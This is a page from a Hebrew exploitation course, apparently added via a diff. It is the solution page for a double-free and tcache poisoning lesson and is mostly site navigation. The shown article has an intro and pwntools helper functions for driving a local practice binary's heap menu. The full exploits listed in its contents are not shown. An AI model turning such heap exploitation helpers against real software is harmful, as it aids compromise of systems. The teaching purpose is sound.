+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6   ROP מתקדם
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_9" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_9" id="__nav_7_2_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7   ניצול הHeap
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_9_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    7   ניצול הHeap
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.1   פנימיות המקצה של glibc
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.2%20-%20%D7%A9%D7%99%D7%9E%D7%95%D7%A9%20%D7%9C%D7%90%D7%97%D7%A8%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8/7.2%20-%20%D7%A9%D7%99%D7%9E%D7%95%D7%A9%20%D7%9C%D7%90%D7%97%D7%A8%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.2   שימוש לאחר שחרור
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_9_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_9_3" id="__nav_7_2_9_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3   שחרור כפול וtcache poisoning
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_9_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_9_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    7.3   שחרור כפול וtcache poisoning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3 - שחרור כפול וtcache poisoning - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3 - שחרור כפול וtcache poisoning - פתרון
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3 - שחרור כפול וtcache poisoning - פתרון
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-tcache-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון - שחרור כפול וtcache poisoning
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="פתרון - שחרור כפול וtcache poisoning">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-tcache" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 1 - מיפוי ה-tcache
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-229" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 2 - בדיקת המפתח של 2.29 ועקיפתה
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-leak-libc-unsorted-bin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 3 - leak libc דרך ה-unsorted bin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-__free_hook-glibc-231" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 4 - הרעלה אל __free_hook (glibc 2.31)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-glibc-235" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 5 - אותה התקפה על glibc 2.35
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-edit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 6 (אתגר) - שחרור כפול טהור בלי edit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3 - שחרור כפול וtcache poisoning - תרגול
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.4%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%AA%20unlink/7.4%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%AA%20unlink%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.4   תקיפת unlink
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.5%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20heap%20%D7%95%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20House%20of/7.5%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20heap%20%D7%95%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20House%20of%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.5   גלישת heap וטכניקות House of
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA/7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.6   תקיפות tcache וfastbin מודרניות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.7%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20heap%20%D7%9E%D7%9C%D7%90/7.7%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20heap%20%D7%9E%D7%9C%D7%90%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.7   פרויקט ניצול heap מלא
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8   הנדסה הפוכה לניצול
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../10%20-%20%D7%9E%D7%A6%D7%99%D7%90%D7%AA%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%90%D7%9E%D7%99%D7%AA%D7%99%D7%95%D7%AA/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10   מציאת חולשות אמיתיות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-GPU/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות GPU
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-tcache-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון - שחרור כפול וtcache poisoning
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="פתרון - שחרור כפול וtcache poisoning">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-tcache" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 1 - מיפוי ה-tcache
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-229" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 2 - בדיקת המפתח של 2.29 ועקיפתה
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-leak-libc-unsorted-bin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 3 - leak libc דרך ה-unsorted bin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-__free_hook-glibc-231" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 4 - הרעלה אל __free_hook (glibc 2.31)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-glibc-235" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 5 - אותה התקפה על glibc 2.35
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-edit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון תרגיל 6 (אתגר) - שחרור כפול טהור בלי edit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="ניווט" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    דף הבית
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר ו-Low Level
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר חולשות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    7   ניצול הHeap
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    7.3   שחרור כפול וtcache poisoning
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>7.3 - שחרור כפול וtcache poisoning - פתרון</h1>
+
+<h2 id="-tcache-poisoning">פתרון - שחרור כפול וtcache poisoning<a class="headerlink" href="#-tcache-poisoning" title="Permanent link">&para;</a></h2>
+<p>נעבור תרגיל אחרי תרגיל עם הפקודות האמיתיות, הפלט הצפוי וה-exploit המלא. כל הכתובות וה-offset-ים בפלט מתייחסים ל-libc ספציפי (libc-2.31 מ-Ubuntu 20.04, ובהמשך libc-2.35 מ-Ubuntu 22.04). אצלכם הם יהיו שונים - <strong>תמיד תמדדו בעצמכם ב-gdb</strong> ותשלפו סמלים מה-libc שלכם, לעולם אל תעתיקו offset עיוור.</p>
+<p>נגדיר קודם את פונקציות העזר שמדברות עם התפריט. נשתמש בהן בכל התרגילים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./tc&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">():</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./tc&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="k">def</span><span class="w"> </span><span class="nf">menu</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">opt</span><span class="p">):</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="k">def</span><span class="w"> </span><span class="nf">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    <span class="n">menu</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx: &#39;</span><span class="p">,</span>  <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;size: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;data: &#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="k">def</span><span class="w"> </span><span class="nf">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>    <span class="n">menu</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="k">def</span><span class="w"> </span><span class="nf">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>    <span class="n">menu</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;data: &#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="k">def</span><span class="w"> </span><span class="nf">view</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>    <span class="n">menu</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+</code></pre></div>
